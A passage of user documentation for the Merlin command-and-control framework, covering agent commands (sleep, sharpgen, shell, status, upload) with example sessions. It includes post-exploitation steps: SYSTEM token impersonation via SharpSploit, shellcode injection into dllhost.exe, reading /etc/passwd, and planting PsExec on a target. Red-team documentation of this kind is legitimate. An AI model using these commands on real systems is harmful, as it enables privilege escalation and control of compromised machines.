<p>The <code class="docutils literal notranslate"><span class="pre">sleep</span></code> control type is used to change the amount of time that an agent will sleep before checking in again. The default is 30 seconds. The values provided to this command are written in a time format. For example, <code class="docutils literal notranslate"><span class="pre">30s</span></code> is 30 seconds and <code class="docutils literal notranslate"><span class="pre">60m</span></code> is 60 minutes. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the <code class="docutils literal notranslate"><span class="pre">agent</span> <span class="pre">info</span></code> command.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set sleep 15s
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job npMYqwASOD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</div>
</div>
<div class="section" id="sharpgen">
<h2>sharpgen<a class="headerlink" href="#sharpgen" title="Permalink to this headline">¶</a></h2>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last">The .NET Core 2.1 SDK must be manually installed by the operator and the SharpGen executable must be built before the <code class="docutils literal notranslate"><span class="pre">sharpgen</span></code> command can be used</p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">sharpgen</span></code> command leverages Ryan Cobb’s <a class="reference external" href="https://github.com/cobbr/SharpGen">SharpGen</a> project and the <a class="reference external" href="https://dotnet.microsoft.com/download/dotnet-core/2.1">.NET Core 2.1 SDK</a> to dynamically compile and execute .NET assemblies. After assembly is compiled, the same steps documented in <a class="reference internal" href="#execute-assembly">execute-assembly</a> are followed. SharpGen also leverages functionality from the <a class="reference external" href="https://github.com/cobbr/SharpSploit">SharpSploit</a> project that can be called directly from this <code class="docutils literal notranslate"><span class="pre">shargen</span></code> command. This command uses a hardcoded output that places compiled executables to the Merlin root directory as <code class="docutils literal notranslate"><span class="pre">sharpgen.exe</span></code>.</p>
<p>For more granular control and additional configuration options, use the <code class="docutils literal notranslate"><span class="pre">windows/x64/csharp/misc/SharpGen</span></code> module.</p>
<p>SharpGen is git a submodule in the <code class="docutils literal notranslate"><span class="pre">data/src/cobbr/SharpGen</span></code> directory. From this directory, run the <code class="docutils literal notranslate"><span class="pre">dotnet</span> <span class="pre">build</span> <span class="pre">-c</span> <span class="pre">release</span></code> command to build the <code class="docutils literal notranslate"><span class="pre">SharpGen.dll</span></code> executable.</p>
<p>The <code class="docutils literal notranslate"><span class="pre">sharpgen</span></code> command is executed as: <code class="docutils literal notranslate"><span class="pre">shaprgen</span> <span class="pre">&lt;code&gt;</span> <span class="pre">[&lt;spawnto</span> <span class="pre">path&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">args&gt;]</span></code></p>
<p>The <code class="docutils literal notranslate"><span class="pre">code</span></code> positional argument is the .NET code you want to compile and execute. All code is automatically wraped in <code class="docutils literal notranslate"><span class="pre">Console.WriteLine();</span></code> and it does not need to be included again. All other arguments are optional. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> argument is the process that will be started on the target and where the shellcode will be injected and executed. If a <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> is not provided, <code class="docutils literal notranslate"><span class="pre">C:\WIndows\System32\dllhost.exe</span></code> will be used. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">args&gt;</span></code> value is used as an argument when starting the spawnto process.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Use <code class="docutils literal notranslate"><span class="pre">\</span></code> to escape any characters inside of the code argument and use quotes to enclose the entire code argument (e.g., <code class="docutils literal notranslate"><span class="pre">&quot;new</span> <span class="pre">Tokens().MakeToken(\&quot;RAstley\&quot;,</span> <span class="pre">\&quot;\&quot;,</span> <span class="pre">\&quot;P&#64;ssword\&quot;)&quot;</span></code>)</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sharpgen &quot;new SharpSploit.Credentials.Tokens().GetSystem()&quot;
[-] Created job oeOBXfBuPS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job oeOBXfBuPS

Getting system...
Impersonate NT AUTHORITY\SYSTEM...
Processes for NT AUTHORITY\SYSTEM: 25
Attempting to impersonate: NT AUTHORITY\SYSTEM
Attempting to impersonate: NT AUTHORITY\SYSTEM
Impersonated: NT AUTHORITY\SYSTEM
True
</pre></div>
</div>
</div>
<div class="section" id="shell">
<h2>shell<a class="headerlink" href="#shell" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">shell</span></code> command is used to task the agent to execute the provided arguments using the operating system’s default
shell and return STDOUT/STDERR. On Windows the <code class="docutils literal notranslate"><span class="pre">%COMSPEC%</span></code> shell is used and if it is <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> then the <code class="docutils literal notranslate"><span class="pre">/c</span></code>
argument is used. For macOS and Linux, the <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> shell is used with the <code class="docutils literal notranslate"><span class="pre">-c</span></code> argument.
Use the <a class="reference internal" href="#run">run</a> command to execute a program directly without invoking the shell.</p>
<p>Example using <code class="docutils literal notranslate"><span class="pre">ver</span></code>:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ver
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job IxVXgyIkhS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job IxVXgyIkhS

Microsoft Windows [Version 10.0.16299.64]
</pre></div>
</div>
<div class="section" id="id12">
<h3>Shell Functions<a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h3>
<p>Some commands and capabilities are components of a shell and can <em>ONLY</em> be used with a shell.
For example, the <code class="docutils literal notranslate"><span class="pre">dir</span></code> command is a component of <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> and is not its own program executable.
Therefore, <code class="docutils literal notranslate"><span class="pre">dir</span></code> can only be used within the <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> shell.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir
</pre></div>
</div>
<p>The pipe and redirection characters <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , and <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> , are also functions of a shell environment.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell &quot;cat /etc/passwd | grep root&quot;
</pre></div>
</div>
</div>
<div class="section" id="id13">
<h3>Quoted Arguments<a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h3>
<p>When running a command on an agent from the server, the provided arguments are passed to executable that was called.
As long as there are no special characters (e.g., <code class="docutils literal notranslate"><span class="pre">\</span></code> , <code class="docutils literal notranslate"><span class="pre">&amp;</span></code> , <code class="docutils literal notranslate"><span class="pre">;</span></code> , <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> etc.) the command will be processed fine.</p>
<p>For example, this command will work fine because it does not have any special characters:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe Get-Service -Name win* -Exclude WinRM
</pre></div>
</div>
<p>However, this command <strong>WILL</strong> fail because of the <code class="docutils literal notranslate"><span class="pre">|</span></code> symbol. The command will still execute, but will stop processing everything after the <code class="docutils literal notranslate"><span class="pre">|</span></code> symbol.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe Get-Service -Name win* -Exclude WinRM | fl
</pre></div>
</div>
<p>To circumvent this, enclose the entire argument in quotes. The outer most quotes will be removed when the arguments are
passed. The argument can be enclosed in double quotes or single quotes. All other quotes need to be escaped
The command be executed in both of these ways:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe &quot;Get-Service -Name win* -Exclude WinRM | fl&quot;
</pre></div>
</div>
<p><strong>OR</strong></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe &quot;Get-Service -Name \&quot;win*\&quot; -Exclude &quot;WinRM&quot; | fl&quot;
</pre></div>
</div>
<p><strong>OR</strong></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe &#39;Get-Service -Name \&#39;win*\&#39; -Exclude &#39;WinRM&#39; | fl&#39;
</pre></div>
</div>
</div>
<div class="section" id="id14">
<h3>Escape Sequence<a class="headerlink" href="#id14" title="Permalink to this headline">¶</a></h3>
<p>Following along with the Quoted Arguments section above, the <code class="docutils literal notranslate"><span class="pre">\</span></code> symbol will be interpreted as an escape sequence.
This is beneficial because it can be used to escape other characters like the pipe symbol, <code class="docutils literal notranslate"><span class="pre">|</span></code> .
However, it can work against you when working with Windows file paths and the arguments are not enclosed in quotes.</p>
<p>This command will fail because the <code class="docutils literal notranslate"><span class="pre">\</span></code> itself needs to escaped. Notice the error message shows File Not Found:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir C:\Windows\System32
[-]Created job hBYxRfaRBG for agent 21a0fc5f-14ad-4c43-b41e-57eab1feb0e1
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job hBYxRfaRBG
[+]  Volume in drive C has no label.
 Volume Serial Number is AC57-CFB9

 Directory of C:\

File Not Found
</pre></div>
</div>
<p>To correctly issue the command either escape the <code class="docutils literal notranslate"><span class="pre">\</span></code> or enclose the commands in quotes:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir C:\\Windows\\System32
</pre></div>
</div>
</div>
</div>
<div class="section" id="status">
<h2>status<a class="headerlink" href="#status" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">status</span></code> command is used to simply print if the Merlin Agent is Active, Delayed, or Dead to the screen. This becomes useful when you come back to Merlin after a couple of hours or if you want to see if your shell has died.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» status
Active
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
</pre></div>
</div>
</div>
<div class="section" id="upload">
<h2>upload<a class="headerlink" href="#upload" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">upload</span></code> command is used to upload a file <em>from</em> the Merlin server <em>to</em> the host where the Merlin agent is running. The command is called by proving the location of the file on the Merlin server followed by the location to save the file on the host where the Merlin agent is running.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Enclose file paths containing a space with quotation marks (e.g.,. <code class="docutils literal notranslate"><span class="pre">&quot;C:\\Windows\\Program</span> <span class="pre">Files\\&quot;</span></code>)</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» upload C:\\SysinternalsSuite\\PsExec.exe C:\\Windows\\PsExec.exe
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job vXJsZdZLPP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="listeners.html" class="btn btn-neutral float-right" title="Listener Menu" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="main.html" class="btn btn-neutral float-left" title="Main Menu" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        
        &copy; Copyright 2020, Russel Van Tuyl (@Ne0nd0g)

    </p>
  </div>
    
    
    
    Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a
    
    <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a>
    
    provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script>

  
  
    
   

</body>
</html>